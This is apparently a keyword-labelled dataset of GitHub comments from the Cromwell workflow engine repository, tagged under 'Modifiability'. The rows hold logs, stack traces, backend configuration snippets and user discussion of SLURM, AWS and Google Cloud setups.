12:16:11,576 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2018-06-07 12:16:12,232 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2018-06-07 12:16:12,406 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Cromwell service started...; 2018-06-07 12:16:40,751 cromwell-system-akka.dispatchers.api-dispatcher-116 INFO - Unspecified type (Unspecified version) workflow dd0b1399-ebb6-4d9b-89ea-7da193994220",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:96662,config,configured,96662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['config'],['configured']
Modifiability,"t-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation that advise, when running Cromwell with SLURM, to use configurations such as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#configuration)):; ```; sbatch \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; ```; or as (see [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#e-now-add-the-following-text-after-line-479-ie-after-the-line-reading-default-slurm-ensure-that-the-lines-that-show-line-breaks-in-this-document-are-in-fact-single-lines-in-referenceconf), or [here](https://cromwell.readthedocs.io/en/stable/backends/SLURM/), or [here](https://cromwell.readthedocs.io/en/stable/tutorials/HPCSlurmWithLocalScratch/#configure-the-execution-environment-for-cromwell), or [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/slurm.conf)); ```; sbatch \; -o ${out} \; -e ${err} \; ```; which overwrites `stdout` and `stderr` written by the `script` file, whic",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:2912,config,configurations,2912,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,1,['config'],['configurations']
Modifiability,"t` file lists the CI expectations of the workflow run, ex: `centaur/src/main/resources/standardTestCases/hello.test`. > the stderr files are totally empty, and then the one stdout (without extension) shows those two mapping files … Let me know if this looks correct? What you are looking for? Completely off base?. Based on the WDL you linked to, this output looks like what was expected :+1:. > Also - any reason to have all capitals vs. lowercase for the backend examples? (e.g. SLURM vs slurm). no reasoN. ---. On a related note I personally would love to see cromwell+singularity running under our CI, so that we could all a) point others at the working example and b) be sure the examples continue to work in the future. Most Broadies I know are even greener on Singularity than CircleCI, but I would be keen to learn sometime. Google turned up your earlier work on installing (parts-of?) [Singularity on a Travis VM](https://github.com/singularityhub/singularity-ci). That combined with these commented out configs could be a fantastic starting point to getting singularity+cromwell regularly tested together. For a similar example, with cromwell+TES, here is where that CI script installs and runs `funnel`:. https://github.com/broadinstitute/cromwell/blob/9f33e2a867fe20924e4f24e0cba8774f7d6d3132/src/ci/bin/testCentaurTes.sh#L14-L36. A similar script that installs the singularity binaries plus a small cluster(?) and then uses a working config file to run our Centaur test suite would be amazing for users. After it's all working, users are being pointed to docs under https://cromwell.readthedocs.io/, such as https://cromwell.readthedocs.io/en/stable/backends/TES/. A similar entry should be added for a working/tested singularity setup. [![Approved with PullApprove](https://img.shields.io/badge/two_reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/4039/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519:1663,config,configs,1663,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519,2,['config'],"['config', 'configs']"
Modifiability,"tantiate Cromwell System. Shutting down Cromwell.; liquibase.exception.MigrationFailedException: Migration failed for change set changesets/failure_metadata.xml::causedByLists::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809:1814,Enhance,EnhancedSqlDatabase,1814,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"tart solves the problem then you may want; to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the; workflow bucket? If not, are they in the same region?. On Wed, Nov 11, 2020 at 4:28 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > The improved multipart copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1388,config,configuration,1388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['config'],['configuration']
Modifiability,tents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:2015,Config,ConfigAsyncJobExecutionActor,2015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"thanks for you reply. i mean in `aws backend ` mode, instead of `local mode`. there is no option to set `submit-docker`, i attached the backend part of my aws.conf as follows. ```bash; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://yuce/cromwell-execution""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default"". numSubmitAttempts = 3; numCreateDefinitionAttempts = 3. concurrent-job-limit = 16. default-runtime-attributes {; queueArn: ""arn:aws-cn:batch:cn-northwest-1:723230375162:job-queue/first-run-job-queue"",; }. filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-701201752:325,config,config,325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-701201752,1,['config'],['config']
Modifiability,"there are still config errors in this space, might want to hold off starting reviews until those are sorted out",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3729#issuecomment-394766552:16,config,config,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3729#issuecomment-394766552,1,['config'],['config']
Modifiability,this bug has so been refactored out of existence,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/520#issuecomment-253930606:21,refactor,refactored,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/520#issuecomment-253930606,1,['refactor'],['refactored']
Modifiability,"this has come up a few times in a few different issues and that multitude actually makes the larger point here. Internally we've been discussing how to handle this as an upcoming project. In particular the problem is that we have too many different user personas and trying to have a single form of log meet all of their needs is going to be useless. Log levels doesn't quite capture all of the variables that might be in play here as often what happens is that someone 99% of the time only wants to see form X but once in a while *really* needs to see form Y and it's useless if Y wasn't captured at all. We're going to be moving towards some sort of system where there are different sorts of logs and then everyone can be happy, or at least happier. That's probably at least a ""next quarter"" level of project, however.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281771971:395,variab,variables,395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281771971,1,['variab'],['variables']
Modifiability,tion.TraversableLike$WithFilter.foreach(TraversableLike.scala:788); 	at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at scala.collection.generic.Growable.$plus$plus$eq(Growable.scala:59); 	at scala.collection.generic.Growable.$plus$plus$eq$(Growable.scala:50); 	at scala.collection.mutable.ListBuffer.$plus$plus$eq(ListBuffer.scala:186); 	at scala.collection.mutable.ListBuffer.$plus$plus$eq(ListBuffer.scala:44); 	at scala.collection.TraversableLike.to(TraversableLike.scala:590); 	at scala.collection.TraversableLike.to$(TraversableLike.scala:587); 	at scala.collection.AbstractTraversable.to(Traversable.scala:104); 	at scala.collection.TraversableOnce.toList(TraversableOnce.scala:294); 	at scala.collection.TraversableOnce.toList$(TraversableOnce.scala:294); 	at scala.collection.AbstractTraversable.toList(Traversable.scala:104); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4(EcmaScriptUtil.scala:111); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4$adapted(EcmaScriptUtil.scala:107); 	at scala.collection.MapLike$MappedValues.$anonfun$foreach$3(MapLike.scala:253); 	at scala.collection.TraversableLike$WithFilter.$anonfun$foreach$1(TraversableLike.scala:789); 	at scala.collection.immutable.Map$Map2.foreach(Map.scala:146); 	at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:788); 	at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1(EcmaScriptUtil.scala:107); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1$adapted(EcmaScriptUtil.scala:97); 	at cwl.internal.EnhancedRhinoSandbox.eval(EnhancedRhinoSandbox.scala:61); 	at cwl.internal.EcmaScriptUtil$.evalRaw(EcmaScriptUtil.scala:69); 	at cwl.internal.EcmaScriptUtil$.evalStructish(EcmaScriptUtil.scala:97); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:76); 	at cwl.ExpressionEvaluator$.evaluator$1(ExpressionEvaluator.scala:40); 	at cwl.ExpressionEvaluator$.$anonfun$eva,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787:2077,adapt,adapted,2077,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787,1,['adapt'],['adapted']
Modifiability,"tionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunctio",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:4588,Config,ConfigAsyncJobExecutionActor,4588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"titute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/async/AsyncBackendJobExecutionActor.scala) file, and some of the important stores would be the [ExecutionStore](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/core/src/main/scala/cromwell/core/ExecutionStore.scala), the [BackendJobDescriptor and BackendJobDescriptorKey](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/package.scala#L17-31), which contain the [Call containing the AST](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Call.scala#L10-61) and sequence of [Tasks](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Task.scala). Since the WorkflowManagerActor (WMA) is just an asynchronous queue selecting the workflow based on the root and its dependencies, then it sounds to be just a scheduling pool service submitting to the EJEA, which prepares it for the specific backend. The recovery for the EJEA is assumed to be an uniform designed protocol, which prepares the execution for the specific backend. . Regarding the backend recovery, since at the core the implementations is really Java (even though everything is in Scala), one can save the running state periodically through serialized snapshots, using something like [Apache JavaFlow](http://commons.apache.org/sandbox/commons-javaflow/) or another similar approach. If this becomes too cumbersome and the cost of resubmitting a job to a specific Backend is on the average time-span not excessive, then resubmitting the whole job might be Occam's razor. There are other approaches, depending on the preferability of flexibility, and I am sure I might have miswrote/misinterpreted something here based on my periodic analysis of the source code - so feel free to correct me :). Thanks,; ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371:1723,sandbox,sandbox,1723,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371,1,['sandbox'],['sandbox']
Modifiability,tor.ActorInitializationException$.apply(Actor.scala:193); 	at akka.actor.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; ```. I tried adding the [reference services block](https://github.com/broadinstitute/cromwell/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1336,config,config,1336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,"tutorials/PipelinesApi101/). The following command does not work:; ```; $ gcloud projects add-iam-policy-binding xxx --member serviceAccount:xxx@xxx.gserviceaccount.com --role roles/compute.zones.list; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/compute.zones.list is not supported for this resource.; ```; I have no idea what I should do. Why can't Cromwell simply provide the command line needed to change the permission?. As for Requester Pays, following the [documentation](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) I have set up the `project` field in the `gcs` filesystem configuration (completely unclear which one in the documentation, as according to the tutorial there are two, but I have included `project` in both ...) in the configuration file as follows:; ```; include required(classpath(""application"")). google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""xxx"". // Base bucket for workflow executions; root = ""gs://xxx/cromwell-execution"". // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, n",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:1383,config,configuration,1383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,1,['config'],['configuration']
Modifiability,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2250,variab,variable,2250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780,5,"['config', 'variab']","['config', 'configurable', 'configuraiton', 'configuration', 'variable']"
Modifiability,un$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; 905198- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; 905199- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905200- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905201- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; 905202- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; 905203- at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; 905204- at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; 905205- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 905206- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 905207- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 905208- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 905209- at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; 905210- at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; 905211- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 905212- at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; 905213- at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; 905214- at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]. ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:7168,Adapt,AdaptedForkJoinTask,7168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['Adapt'],['AdaptedForkJoinTask']
